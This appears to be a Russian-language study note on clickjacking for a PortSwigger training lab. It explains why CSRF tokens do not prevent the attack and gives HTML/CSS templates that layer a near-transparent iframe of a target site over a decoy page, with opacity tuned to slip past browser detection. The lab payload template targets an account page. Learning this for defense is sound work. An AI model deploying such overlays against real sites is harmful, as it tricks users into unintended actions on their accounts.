## Что такое кликджекинг?

Защита от CSRF-атак часто обеспечивается использованием CSRF-токена: сессионного, одноразового номера или nonce. Кликджекинг-атаки не компенсируются CSRF-токеном, так как целевая сессия создаётся с контентом, загруженным с аутентичного сайта, и все запросы выполняются на домене. CSRF-токены помещаются в запросы и передаются на сервер в рамках обычной сессии. Отличие от обычной пользовательской сессии в том, что процесс происходит внутри скрытого iframe.

---

## Как построить базовую атаку кликджека

Кликджек-атаки используют CSS для создания и манипуляции слоями. Злоумышленник использует целевой сайт в виде слоя iframe, наложенного на ложный сайт. Пример с тегом стиля и параметрами выглядит следующим образом:

```html
<head> 
	<style> 
		#target_website { 
			position:relative; width:128px; height:128px; opacity:0.00001; z-index:2; 
		} 
		#decoy_website { 
			position:absolute; width:300px; height:400px; z-index:1; 
		} 
	</style> 
</head> 
... 
<body> 
	<div id="decoy_website"> 
	...decoy web content here...
	</div> 
	<iframe id="target_website" src="https://vulnerable-website.com"> </iframe> 
</body>
```

iframe целевой сайта расположен внутри браузера так, чтобы целевое действие точно совпадало с обманным сайтом с использованием соответствующих значений ширины и высоты. Абсолютные и относительные значения позиции используются для того, чтобы целевой сайт точно перекрывал приманку независимо от размера экрана, типа браузера и платформы. Z-индекс определяет порядок стекирования слоёв iframe и веб-сайта. Значение непрозрачности определяется как 0.0 (или близко к 0.0), чтобы содержимое iframe было прозрачным для пользователя. Защита от кликджека браузера может применять пороговое обнаружение прозрачности iframe (например, в Chrome версии 76 это поведение есть, а Firefox — нет). Злоумышленник выбирает значения непрозрачности, чтобы добиться желаемого эффекта без активации защитного поведения.

---

# Лабораторные 

---

### Lab: Basic clickjacking with CSRF token protection

[Clickjacking (UI redressing) - Lab: Basic clickjacking with CSRF token protection](https://portswigger.net/web-security/learning-paths/clickjacking/clickjacking-how-to-construct-a-basic-clickjacking-attack/clickjacking/lab-basic-csrf-protected)

```
<style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```